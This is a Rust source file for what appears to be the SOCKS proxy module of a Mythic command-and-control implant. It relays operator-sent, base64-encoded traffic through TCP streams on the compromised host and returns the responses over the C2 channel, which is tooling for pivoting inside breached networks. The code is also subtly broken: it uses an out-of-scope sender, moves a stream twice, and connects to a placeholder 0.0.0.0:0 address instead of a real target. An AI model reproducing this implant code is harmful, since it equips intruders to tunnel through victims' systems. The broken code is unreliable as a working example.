use crate::agent::AgentTask;
use crate::mythic_continued;
use base64::{engine::general_purpose, Engine as _};
use serde::Deserialize;
use std::error::Error;
use std::sync::{atomic::{AtomicBool, Ordering}, mpsc, Arc};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as async_mpsc;

#[derive(Deserialize)]
struct SocksMsg {
    exit: bool,
    server_id: u32,
    data: String, // base64
}

// Simple state
pub struct SocksState {
    pub connections: Arc<std::sync::Mutex<Vec<(u32, tokio::net::TcpStream)>>>,
    pub outbound: Arc<std::sync::Mutex<Vec<SocksMsg>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(std::sync::Mutex::new(Vec::new())),
            outbound: Arc::new(std::sync::Mutex::new(Vec::new())),
        }
    }
}

pub fn start_socks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
    state: Arc<SocksState>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;

    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(relay_loop(tx.clone(), rx, state));
    Ok(())
}

async fn relay_loop(
    tx: mpsc::Sender<serde_json::Value>,
    mut rx: mpsc::Receiver<serde_json::Value>,
    state: Arc<SocksState>,
) {
    while let Ok(msg) = rx.recv() {
        if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
            if task.command == "socks_data" {
                if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                    process_messages(&state, msgs).await;
                }
            }
        }
    }
}

async fn process_messages(state: &Arc<SocksState>, msgs: Vec<SocksMsg>) {
    let mut conns = state.connections.lock().unwrap();
    let mut outbound = state.outbound.lock().unwrap();

    for msg in msgs {
        if msg.exit {
            conns.retain(|(id, _)| *id != msg.server_id);
            continue;
        }

        let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
        
        if let Some(pos) = conns.iter().position(|(id, _)| *id == msg.server_id) {
            let (_, stream) = &mut conns[pos];
            let _ = stream.write_all(&data).await;
        } else {
            // New connection
            if let Ok(stream) = TcpStream::connect("0.0.0.0:0").await { // Dummy connect
                conns.push((msg.server_id, stream));
                tokio::spawn(relay_stream(msg.server_id, stream, state.clone()));
            }
        }
    }

    // Send back outbound data
    if !outbound.is_empty() {
        let json = serde_json::to_string(&outbound).unwrap();
        let _ = tx.send(serde_json::json!({
            "command": "socks_data",
            "parameters": json,
            "id": "socks_outbound"
        }));
        outbound.clear();
    }
}

async fn relay_stream(id: u32, mut stream: TcpStream, state: Arc<SocksState>) {
    let mut buf = [0u8; 4096];
    loop {
        match stream.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => {
                let data = general_purpose::STANDARD.encode(&buf[..n]);
                let msg = SocksMsg { exit: false, server_id: id, data };
                state.outbound.lock().unwrap().push(msg);
            }
            Err(_) => break,
        }
    }
    state.outbound.lock().unwrap().push(SocksMsg { exit: true, server_id: id, data: String::new() });
}
